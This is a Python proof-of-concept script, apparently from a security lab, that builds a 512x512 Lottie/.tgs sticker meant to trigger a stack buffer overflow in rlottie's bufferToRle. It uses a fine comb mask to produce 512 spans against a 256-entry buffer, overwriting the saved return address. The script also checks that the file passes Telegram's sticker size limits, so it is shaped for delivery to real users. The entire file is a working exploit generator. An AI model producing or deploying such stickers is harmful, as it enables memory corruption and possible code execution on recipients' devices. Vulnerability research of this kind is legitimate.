#!/usr/bin/env python3
"""
lab1/gen_poc_v3.py
Generate a 512x512 Lottie/.tgs sticker that overflows bufferToRle by ~256 spans
(2048 bytes) — enough to reach and overwrite the saved return address.

Key difference from v2:
  v2 used 256 teeth at 1-unit width → 2px after 2x scale → only 256 spans → 2-byte overflow
  v3 uses 512 teeth at 0.5-unit width → 1px after 2x scale → 512 spans → 2048-byte overflow

The XOR of a solid mask with a 1px-tooth comb produces [0,255,0,255,...] across
1024 pixels, generating 512 non-zero runs in bufferToRle. The temp[256] buffer
overflows by 256 spans = 2048 bytes, smashing saved RBP and saved RIP.
"""

import argparse
import gzip
import io
import json
import sys


def make_rect_path(x0, y0, x1, y1):
    """Closed Lottie bezier rectangle."""
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_comb_path_fine(width, height, n_teeth):
    """
    Comb polygon with n_teeth teeth, each 0.5 units wide with 0.5-unit gaps.
    Total horizontal extent = n_teeth * 1.0 units = n_teeth pixels in pre-transform.

    After 2x scale transform:
      - Each tooth: 1px wide
      - Each gap: 1px wide
      - Total: 2 * n_teeth pixels = 1024px (when n_teeth=512)

    This produces the alternating [0,255,0,255,...] coverage pattern that
    generates 512 spans in bufferToRle — overflowing temp[256] by 256 spans.
    """
    H = float(height)
    verts = []

    for k in range(n_teeth):
        x_base = float(k)
        x_tooth_end = x_base + 0.5

        # Each tooth: rectangle from x_base to x_base+0.5, full height on top,
        # then drops to bottom at x_base+0.5, continues to x_base+1.0 at bottom
        verts.append([x_base, 0.0])
        verts.append([x_tooth_end, 0.0])
        verts.append([x_tooth_end, H])
        verts.append([float(k + 1), H])

    # Close the path
    verts.append([float(n_teeth), H])
    verts.append([0.0, H])

    n = len(verts)
    zeros = [[0.0, 0.0]] * n
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def build_lottie(canvas_w, canvas_h, n_teeth, scale_factor):
    pre_w = canvas_w
    pre_h = canvas_h

    solid_path = make_rect_path(0, 0, pre_w, pre_h)
    comb_path = make_comb_path_fine(pre_w, pre_h, n_teeth)

    def static_path(p):
        return {"a": 0, "k": p}

    def static_val(v):
        return {"a": 0, "k": v}

    scale_pct = scale_factor * 100
    identity_ks = {
        "p": static_val([0, 0, 0]),
        "a": static_val([0, 0, 0]),
        "s": static_val([scale_pct, scale_pct, 100]),
        "r": static_val(0),
        "o": static_val(100),
    }

    layer = {
        "ty": 4,
        "nm": "FineOverflow",
        "ind": 1,
        "st": 0,
        "ip": 0,
        "op": 2,
        "sr": 1,
        "ks": identity_ks,
        "hasMask": True,
        "masksProperties": [
            {
                "mode": "a",
                "inv": False,
                "pt": static_path(solid_path),
                "o": static_val(100),
            },
            {
                "mode": "f",
                "inv": False,
                "pt": static_path(comb_path),
                "o": static_val(100),
            },
        ],
        "shapes": [
            {
                "ty": "gr",
                "nm": "G",
                "it": [
                    {
                        "ty": "rc",
                        "nm": "Rect",
                        "p": static_val([canvas_w / 2, canvas_h / 2]),
                        "s": static_val([canvas_w, canvas_h]),
                        "r": static_val(0),
                    },
                    {
                        "ty": "fl",
                        "nm": "Fill",
                        "c": static_val([1, 0, 0, 1]),
                        "o": static_val(100),
                        "r": 1,
                    },
                ],
            }
        ],
    }

    return {
        "v": "5.5.2",
        "fr": 60,
        "ip": 0,
        "op": 2,
        "w": canvas_w,
        "h": canvas_h,
        "nm": "rlottie-overflow-v3",
        "ddd": 0,
        "assets": [],
        "layers": [layer],
    }


def main():
    ap = argparse.ArgumentParser(
        description="Generate rlottie stack-overflow PoC v3 (fine comb, 2048-byte overflow)")
    ap.add_argument("--out", default="poc_v3.tgs", help="Output .tgs path")
    ap.add_argument("--json", default="poc_v3.json", help="Output JSON path")
    ap.add_argument("--teeth", type=int, default=512,
                    help="Comb teeth (default=512, each 0.5 units pre-transform)")
    ap.add_argument("--width", type=int, default=512)
    ap.add_argument("--height", type=int, default=512)
    ap.add_argument("--scale", type=float, default=2.0)
    args = ap.parse_args()

    effective_width = int(args.width * args.scale)
    # Each tooth after scale = 1px, each gap = 1px
    # Non-zero runs = args.teeth (one per gap between teeth where solid coverage remains)
    max_spans = args.teeth

    print(f"Canvas:            {args.width} x {args.height}")
    print(f"Layer scale:       {args.scale}x")
    print(f"Effective width:   {effective_width} px (after transform)")
    print(f"Comb teeth:        {args.teeth} (0.5 units each pre-transform)")
    print(f"Post-transform:    {args.teeth} teeth × 1px + {args.teeth} gaps × 1px = {effective_width}px")
    print(f"Expected spans:    {max_spans}")
    print(f"temp[] capacity:   256")
    print(f"Expected overflow: {max(0, max_spans - 256)} spans = "
          f"{max(0, max_spans - 256) * 8} bytes")
    print(f"Vertices in comb:  {args.teeth * 4 + 2}")
    print()

    lottie = build_lottie(args.width, args.height, args.teeth, args.scale)
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    with open(args.json, "wb") as f:
        f.write(json_bytes)
    print(f"[+] JSON:  {args.json}  ({len(json_bytes):,} bytes)")

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(args.out, "wb") as f:
        f.write(tgs_bytes)
    print(f"[+] TGS:   {args.out}  ({len(tgs_bytes):,} bytes)")

    if args.width != 512 or args.height != 512:
        print(f"\n[warn] Telegram requires 512x512. Current: {args.width}x{args.height}")
    if len(tgs_bytes) > 64 * 1024:
        print(f"\n[FAIL] TGS size {len(tgs_bytes)} exceeds 64KB Telegram limit!")
    else:
        print(f"\n[ok] Passes Telegram checks ({len(tgs_bytes)} < 65536 bytes)")


if __name__ == "__main__":
    main()
